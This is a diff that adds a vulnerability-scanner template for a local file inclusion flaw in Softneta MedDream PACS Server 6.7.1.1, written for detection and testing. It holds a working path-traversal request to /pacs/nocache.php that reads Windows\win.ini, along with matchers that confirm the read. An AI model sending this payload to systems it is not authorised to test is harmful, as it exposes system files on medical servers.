@@ -1,0 +1,21 @@
+id: sofneta-mecdream-pacs-lfi
+name: Softneta MedDream PACS Server Premium 6.7.1.1 - Local File Inclusion
+severity: high
+confidence: tentative
+description: Softneta MedDream PACS Server Premium 6.7.1.1 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- sofneta
+- lfi
+- edb
+- vuln
+requests:
+- method: GET
+  path: /pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+  matchers:
+  - type: body
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  condition: or
